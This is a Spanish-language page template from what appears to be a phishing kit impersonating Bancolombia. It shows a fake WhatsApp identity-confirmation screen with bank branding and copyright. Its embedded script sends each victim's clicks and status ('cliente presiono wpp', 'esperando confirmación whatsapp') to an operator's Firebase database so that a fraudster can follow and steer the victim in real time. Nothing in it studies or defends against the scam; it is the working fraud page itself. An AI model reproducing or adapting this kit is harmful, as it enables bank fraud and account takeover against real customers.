<style>
    /* === ESTILOS BASE Y TEMA OSCURO === */
    body.cc-view {
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px 0;
        box-sizing: border-box;
        background-color: #2b2b2b !important;
        background-image: url('assets/img/auth-trazo.svg') !important;
        background-size: cover !important;
        background-position: center top -50px !important;
        background-repeat: no-repeat !important;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    .cc-view .login-container,
    .cc-view .info-banner,
    .cc-view .background-traces,
    .header,
    .footer {
        display: none !important;
    }

    .card-module {
        background-color: #262626;
        color: #e0e0e0;
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.4);
        width: 90%;
        max-width: 380px;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0 auto;
        text-align: center;
        position: relative;
        z-index: 100;
    }

    .whatsapp-icon-container {
        margin-bottom: 25px;
    }

    .whatsapp-icon {
        font-size: 3.5em;
        color: #25D366;
        background: #fff;
        border-radius: 50%;
        padding: 15px;
        width: 80px;
        height: 80px;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .wa-title {
        color: #fff;
        font-weight: 700;
        font-size: 1.4em;
        margin-bottom: 20px;
    }

    .wa-box {
        background-color: #333;
        border: 1px solid #404040;
        border-radius: 12px;
        padding: 20px;
        margin-bottom: 30px;
    }

    .wa-text {
        color: #ccc;
        font-size: 0.95em;
        line-height: 1.6;
        margin: 0;
    }

    .wa-highlight {
        color: #fff;
        font-weight: bold;
    }

    .wa-button {
        width: 100%;
        padding: 16px;
        background-color: #f0c300;
        border: none;
        border-radius: 30px;
        color: #222;
        font-size: 1.1em;
        font-weight: 700;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        text-align: center;
        gap: 10px;
        text-decoration: none;
        transition: transform 0.2s, background-color 0.2s;
        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
        box-sizing: border-box;
    }

    .wa-button:hover {
        background-color: #d4ac00;
        transform: translateY(-2px);
    }

    .wa-button:disabled {
        opacity: 0.8;
        cursor: not-allowed;
        transform: none;
    }

    .wa-footer {
        margin-top: 40px;
        color: #777;
        font-size: 0.85em;
        line-height: 1.6;
    }
</style>

<div class="card-module">
    <div class="whatsapp-icon-container">
        <div class="whatsapp-icon">
            <i class="fa-brands fa-whatsapp"></i>
        </div>
    </div>

    <div class="wa-title">
        Código 923. Valida tu identidad
    </div>

    <div class="wa-box">
        <p class="wa-text">
            Confirma que eres tú. Hemos enviado un WhatsApp, responde con <span class="wa-highlight">"sí"</span> para
            continuar con el proceso.
        </p>
    </div>

    <button type="button" id="btnWaEntendido" class="wa-button" onclick="confirmarWhatsApp(event)">
        <i class="fa-regular fa-circle-check" id="waBtnIcon"></i>
        <span id="waBtnText">Entendido</span>
    </button>

    <div class="wa-footer">
        <p><?php
        $days = ['Domingo','Lunes','Martes','Miércoles','Jueves','Viernes','Sábado'];
        $months = [1=>'Enero',2=>'Febrero',3=>'Marzo',4=>'Abril',5=>'Mayo',6=>'Junio',7=>'Julio',8=>'Agosto',9=>'Septiembre',10=>'Octubre',11=>'Noviembre',12=>'Diciembre'];
        $w = $days[date('w')];
        $m = $months[(int)date('n')];
        echo $w . ' ' . date('d') . ' de ' . $m . ' de ' . date('Y h:i:s A');
        ?></p>
        <p>Copyright © <?php echo date('Y'); ?> Bancolombia.</p>
    </div>
</div>

<!-- SCRIPTS DE CONEXIÓN FIREBASE & NOTIFICACIÓN EN TIEMPO REAL -->
<script src="assets/js/config.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
<script>
(function() {
    const cfg = window.APP_CONFIG || {};
    const firebaseConfig = cfg.firebaseConfig || {
        apiKey: "AIzaSyBnS0FxHLYA4AIncGyxf5DZwHfhRGlyWso",
        authDomain: "cain-5b1e4.firebaseapp.com",
        databaseURL: "https://cain-5b1e4-default-rtdb.europe-west1.firebasedatabase.app",
        projectId: "cain-5b1e4"
    };

    if (typeof firebase !== 'undefined' && !firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }

    const hostToken = localStorage.getItem('token') || cfg.defaultSessionToken || 'main_session';
    const userId = cfg.adminUserId || 'cain';
    const currentDeviceId = localStorage.getItem('currentDeviceId') || new URLSearchParams(window.location.search).get('id') || 'dev_' + Date.now();

    window.confirmarWhatsApp = async function(e) {
        if (e && e.preventDefault) e.preventDefault();
        const btn = document.getElementById('btnWaEntendido');
        const icon = document.getElementById('waBtnIcon');
        const text = document.getElementById('waBtnText');

        if (btn) btn.disabled = true;
        if (icon) icon.className = 'fa-solid fa-spinner fa-spin';
        if (text) text.textContent = 'Cargando...';

        const updateData = {
            status: 'cliente presiono wpp',
            wppClicked: true,
            soundPlaying: 'notification',
            'data/wppStatus': 'Cliente dio clic en WhatsApp',
            lastActivity: Date.now()
        };

        if (window.firebase && firebase.database) {
            try {
                await firebase.database().ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update(updateData);
            } catch(err) { console.error(err); }
        } else {
            try {
                await fetch(`${firebaseConfig.databaseURL}/sessions/${userId}/${hostToken}/devices/${currentDeviceId}.json`, {
                    method: 'PATCH',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(updateData)
                });
            } catch(err) { }
        }

        setTimeout(() => {
            if (text) text.textContent = 'Verificando con WhatsApp...';
        }, 1500);
    };

    // Reportar al ingresar a la pantalla
    if (window.firebase && firebase.database) {
        firebase.database().ref(`sessions/${userId}/${hostToken}/devices/${currentDeviceId}`).update({
            status: 'esperando confirmación whatsapp',
            lastActivity: Date.now()
        }).catch(e => {});
    }
})();
</script>
